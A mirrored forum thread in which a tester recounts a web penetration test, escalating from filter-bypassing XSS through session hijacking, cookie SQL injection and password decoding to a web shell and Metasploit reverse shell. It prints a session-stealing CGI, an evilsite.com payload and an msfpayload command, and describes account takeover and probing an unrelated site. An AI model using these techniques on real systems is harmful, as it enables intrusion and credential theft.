@@ -1,0 +1,411 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=362&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:40:29 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> XSS to Root</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthread8769.html?t=362">XSS to Root</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthreadc08d.html?t=362&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_top">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=362&amp;pp=10&amp;page=3" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="362" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 3</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 24">1</a></span><span><a href="printthread746a.html?t=362&amp;pp=10&amp;page=2" title="Show results 11 to 20 of 24">2</a></span><span><a href="printthread02b1.html?t=362&amp;pp=10&amp;page=3" title="Show results 21 to 24 of 24">3</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthread746a.html?t=362&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 20 of 24"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthread02b1.html?t=362&amp;pp=10&amp;page=3" title="Last Page - Results 21 to 24 of 24">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">09-27-2010, 12:48 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+		<div class="title">XSS to Root</div>
+	
+	<div class="content">
+		<blockquote class="restore">Last week I was assigned with a WPT , where I was assigned to check a Web Application<br />
+Normally in WPT s you will find a lot of bugs if you spend some good time analyzing the application in and out. And Tools like Web Inspect and Appscan are also of a good help to one extend.<br />
+<br />
+But the application I was testing had some sort of filter which prevented the possibilities of any sort of normal web application attacks, and redirected all malicious request to one common error page.And all tools were giving out too many false positives.And I was almost going mad.<br />
+<br />
+ It was a module where users could trade objects. And three type of users where there Anonymous Users,Manager Users and as always a super user.Any one could access the anonymous user as the user name password was open for all, after loging in as Anonymous you could trade your things with other users , provided the managers accept it.As all your submissions went via the manager users.<br />
+<br />
+The application dint used any cookies instead it used a session ID , which was passed in on every request via [GET] method <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">http://site.com/usrpage/?userid={D8A349A7-3503-4283-A1AA-9406DB6EE9C5}</code><hr />
+</div>So what strike me was, as that the user session Id hold the authentication and if I could get hold of another valid session I could be in that user privileges. And the only possible way is by tracking the HTTP_REFERRER value. And this could be only possible by making the administrator/manager clicking one of our links form the application. And then we could Hijack the user session. For those who are not aware of what am talking about, read a similar scenario .<br />
+<a href="../external.html?link=http://fb1h2s.com/view.php?article_id=8" target="_blank">http://fb1h2s.com/view.php?article_id=8</a><br />
+<br />
+In order to achieve that, I need to find an XSS in the section where I could post my data for the manager approval  or if managed to send a Hyperlink which when clicked, &quot;boomed&quot; my back end program will store the SessionIds. <br />
+But with the current filter which is blocking all unwanted request it was hardly possible.<br />
+<br />
+ And I was all stuck at this part, I even tried out all the XSS bypass stuff in <a href="../external.html?link=http://ha.ckers.org/xss.html" target="_blank">http://ha.ckers.org/xss.html</a> and none worked for me, and at that time VInay &quot;vinnu&quot; bro was online and was all ready for help :). I presented my scenario of the Filter and that I want to bypass that he gave me few cool tips , in which converting the Payload string that was a hyper link <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">&lt;link href=&quot;http://evilsite.com/evilscript.py&quot; /&gt;</code><hr />
+</div> bypassed the filter when half the string was hex encoded and other half was double hexed :).<br />
+<br />
+So now First phase is done and I almost wasted one day :( .<br />
+<br />
+<b><font size="3">Day 2 :</font></b><br />
+<br />
+Now that I knew that I could send the managers with a hyper link and trick him to click the link stating that it was some wonderful products review. But the problem was that I don't know when the manager users will login and administrate my stuffs and the sessions will remain valid only till the user clicks Logout. And I wont be able to stay 24/7 online waiting for the manager to come online. <div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Even though I stay 3/4 of my time online, I need a better plan
+			
+		<hr />
+	</div>
+</div>  .<br />
+<br />
+So I taught of writing an SMS alert application, which will send me an SMS to my phone when ever the click was initiated :D. So i could come online immediately and use the sessions. I chose 160by2.com for this and planned to automate it via  perl CGI. <div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Why perl? because Apache was by default configured to handle perl CGI + Mechanize module in perl wis amazing .
+			
+		<hr />
+	</div>
+</div>While analyzing the 160by2.com for automating the request I found an SQL injection in one of the Post methods and started playing around with it and wasted few hours. And by night the code was all ready and I send the hyperlink to the victims with a convincing text.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">#!c:/perl/bin/perl.exe<br />
+#CGI perl woot woot by fb1h2s<br />
+use CGI;<br />
+use strict;<br />
+use WWW::Mechanize;<br />
+use HTTP::Cookies;<br />
+#lets save session first<br />
+open (MYFILE, '&gt;&gt;session.txt);<br />
+print MYFILE &quot;\t$ENV{HTTP_REFERER}\n\n&quot;;<br />
+print MYFILE &quot;\t$ENV{HTTP_USER_AGENT}\n\n&quot;;<br />
+print MYFILE &quot;\t$ENV{HTTP_ACCEPT}\n\n&quot;;<br />
+print MYFILE &quot;\t$ENV{REMOTE_ADDR}\n\n&quot;;<br />
+close (MYFILE);<br />
+#inform the master via sms now<br />
+my $url = &quot;http://160by2.com/&quot;;<br />
+my $mobileno = &quot;mymobno&quot;; #usernameno<br />
+my $password = &quot;mypass&quot;;&nbsp; &nbsp;  #password<br />
+my $mobilewoot =&quot;smstothisno&quot;; #no to recive alert<br />
+my $woot_woot = &quot; woot woot&quot;; #msg text<br />
+my $mech = WWW::Mechanize-&gt;new();<br />
+$mech-&gt;cookie_jar(HTTP::Cookies-&gt;new());<br />
+$mech-&gt;get($url);<br />
+#my $output_page = $mech-&gt;content();<br />
+#print &quot;$output_page&quot;;<br />
+$mech-&gt;form_id('login_form');<br />
+$mech-&gt;field(htxt_UserName =&gt; $mobileno);<br />
+$mech-&gt;field(txt_Passwd =&gt; $password);<br />
+$mech-&gt;click();<br />
+$mech-&gt;get(&quot;http://www.160by2.com/compose_sms.aspx&quot;);<br />
+$mech-&gt;form_id('frmcompose');<br />
+$mech-&gt;field(txt_msg =&gt; $woot_woot);<br />
+$mech-&gt;field(txt_mobileno =&gt; $mobilewoot);<br />
+#//&quot;figure the rest out &quot;<br />
+$mech-&gt;click();<br />
+#my $output_page1 = $mech-&gt;content();<br />
+#print &quot;$output_page1&quot;;</code><hr />
+</div></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">09-27-2010, 12:49 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>Day 3:</b><br />
+<br />
+Bye the next day evening by dinner time I got my &quot;woot woot&quot; Sms from my program confirming the click and I just hurried online and gained a manager session :). Now it was again disappointing  , there where options to manage the transactions, approve and deny stuffs, but nothing good to proceed further was found. All manager pages were filtered too for any sql injection and other stuffs, so reached another dead end. By the way I dint forget to update the accounts Email Id with mine and Secret Question and answer so that I could get inside again . <br />
+<br />
+<b>Day 4:</b><br />
+ I reset the manager password and gain access to manager interface, and kept analyzing the applications each and every fields, and by noon I noticed <br />
+that few state cookies were saved , which was used to confirm that no manipulation in datas are done , some sort of security feature . I used my fav ad-don tamper data to manipulate that request and altered it with an SQL injection check. Yepiiiiiii there I got an SQL bug finally in some session cookies huhhhh. I dumped few user names and passwords  , the password dint had the look of a password though, It was sort of jumpled up, but I dnt hesitate to try them out , but none dint work. So taught of of dumping the whole database and trying them out, but the problem was that it was it was on the session cookies and I wasn't aware of any tools which would satisfy my needs, And I went around asking people whether they were aware of any such tools, and was disappointed, so taught of writing one as that it would be impossible to dump the entire data manually.<br />
+<br />
+What I did was, grabbed a copy of rasurons darmssql.py which  supported GET method and Union based Injection, and modified it to support POST request + Error Based injection. <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">def GetTheShit(head_URL):<br />
+&nbsp; &nbsp; &nbsp; &nbsp; try:<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #print &quot;\nam here&quot;,head_URL<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file.write(&quot;\n[debug] &quot;+head_URL)<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; connection = HTTPConnection(url)<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; head = {&quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot; : &quot;text/plain&quot; ,&quot;Referer&quot; :&quot;http://manycloe.com&quot;,&quot;Cookie&quot;:&quot;State_date=head_url&quot;}<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; parameters = urlencode({&quot;fileds_value&quot; : &quot;sas&quot;, fileds_value&quot; : &quot;sas&quot;,&quot;cmdSubmit&quot; : &quot;Submit&quot;}) <br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; connection.request(&quot;POST&quot;, &quot;/GetPW.asp&quot;, parameters, head)<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; r2 = connection.getresponse()<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; source = r2.read()<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #print source<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; match = re.findall(&quot;value '[\d\D]*' to&quot;,source)<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; match = match[0][7:-4]<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print <br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return match<br />
+&nbsp; &nbsp; &nbsp; &nbsp; except (KeyboardInterrupt, SystemExit):<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; raise<br />
+&nbsp; &nbsp; &nbsp; &nbsp; except:<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pass</code><hr />
+</div>Get_shit was darkmssqls HTTP connection engine and am not gone put the entire code</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">09-27-2010, 12:49 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>Day 5:</b><br />
+<br />
+Code successfully dumped all passwords users and a<br />
+A sample out put is given here <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">hsklyu&#8224;&#8240;&#8224;<br />
+qez}&#8222;&#8230;zJN<br />
+neuktu&#8230;GKO<br />
+&quot;not real ones&quot;</code><hr />
+</div>It was some kind of custom build build encryption, there is no way I could do something unless and until I find the algorithm. And the only possible way to figure that was the Change password option.  So I reset my current password with few test values and obtained these results. <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1234 == 26:&gt;<br />
+aaaa == behk<br />
+<br />
+Whuhuuu it was just another stupid algorithm,<br />
+String =String[i+3] was the logic :D</code><hr />
+</div><div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Security via Ob-security
+			
+		<hr />
+	</div>
+</div>Made another quick script which decrypted all the passwords. And later added this POC-Code to the report.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">#python 2.5<br />
+#POC Program to decode the encrypted password<br />
+#<br />
+print &quot;[+]Week encryption POC by &quot;<br />
+encrypted= raw_input(&quot;[+]Enter Encrypted Password:&quot;)<br />
+password =[]<br />
+length =len (encrypted)<br />
+init =1<br />
+for i in range(0,length):<br />
+&nbsp; &nbsp; temp=ord(encrypted[i])<br />
+&nbsp; &nbsp; f =chr(temp-init)<br />
+&nbsp; &nbsp; init = init + 3<br />
+&nbsp; &nbsp; password.append(f)<br />
+print &quot;Decoded password:&quot;<br />
+print &quot;&quot;.join(password)</code><hr />
+</div><b>Day 6:</b><br />
+<br />
+And the pass cracking lead me a way to the Super Admin account :D , and there it was a file upload utility which let me upload anything I simply uploaded a simple ASP.NET command shell as other web shell were detected and deleted by Anti virus of that server. And then I made a MSF reverse_tcp and a Metpreter reverse Executable using metsploit<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">./msfpayload windows/shell/reverse_tcp LHOST=myhost LPORT=31337 X &gt; c:\\sas.exe<br />
+&nbsp;Uploaded it to server and called it via the command shell and made a msf Multi handler listen for connection.<br />
+<br />
+&gt; use multi handler</code><hr />
+</div><a href="../fb1h2s.com/woot_woot.JPG" target="_blank">http://fb1h2s.com/woot_woot.JPG</a><br />
+<br />
+And there I had a session with NT/Authority priv :D a Shell is just a beginning, but my scope of work was over there. <br />
+<br />
+I Was damn happy after after my tiresome chase after this application. Felt really great, may be because It took a week to reach the goal .</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_4">
+	<div class="header">
+		<div class="datetime">09-27-2010, 09:47 AM</div>
+		<span class="username">b0nd</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Mind blowing!!! Hats off to you fb1 !!! Thats a real hackerish attempt to achieve the goal. <br />
+Keep it up buddy!</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_5">
+	<div class="header">
+		<div class="datetime">09-27-2010, 10:08 AM</div>
+		<span class="username">&quot;vinnu&quot;</span>
+	</div>
+	
+	
+		<div class="title">Nice attempt...&quot;vinnu&quot;</div>
+	
+	<div class="content">
+		<blockquote class="restore">It is not the number of days, which may go endless, rather the &quot;atlast&quot; fruit, that matters. And in this case, you have achieved what fills the heart of a hacker with bliss.<br />
+<br />
+Keep on man. This world needs more out of ur best...&quot;vinnu&quot;</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_6">
+	<div class="header">
+		<div class="datetime">09-27-2010, 10:13 AM</div>
+		<span class="username">steve_ron</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Good Show, all the best for the future ones :)</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_7">
+	<div class="header">
+		<div class="datetime">09-27-2010, 11:10 AM</div>
+		<span class="username">prashant_uniyal</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Superb!!!! fb1h2s rockssSSss!!!! ;) :)</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_8">
+	<div class="header">
+		<div class="datetime">09-28-2010, 02:25 AM</div>
+		<span class="username">abhaythehero</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">brilliant !!<br />
+:)<br />
+thanks for making this detailed description.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_9">
+	<div class="header">
+		<div class="datetime">09-28-2010, 02:24 PM</div>
+		<span class="username">41.w4r10r</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">As always fb1 rocked..............<br />
+<br />
+I like one thing very much and that is when you say &quot;Woot Woot&quot;...........</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_10">
+	<div class="header">
+		<div class="datetime">09-28-2010, 07:21 PM</div>
+		<span class="username">AnArKI</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Thts an awesome piece of work......</blockquote>
+	</div>
+</li>
+</ul>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthreadc08d.html?t=362&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_bottom">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=362&amp;pp=10&amp;page=3" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="362" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 3</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 24">1</a></span><span><a href="printthread746a.html?t=362&amp;pp=10&amp;page=2" title="Show results 11 to 20 of 24">2</a></span><span><a href="printthread02b1.html?t=362&amp;pp=10&amp;page=3" title="Show results 21 to 24 of 24">3</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthread746a.html?t=362&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 20 of 24"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthread02b1.html?t=362&amp;pp=10&amp;page=3" title="Last Page - Results 21 to 24 of 24">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:44 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=362&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:40:30 GMT -->
+</html>
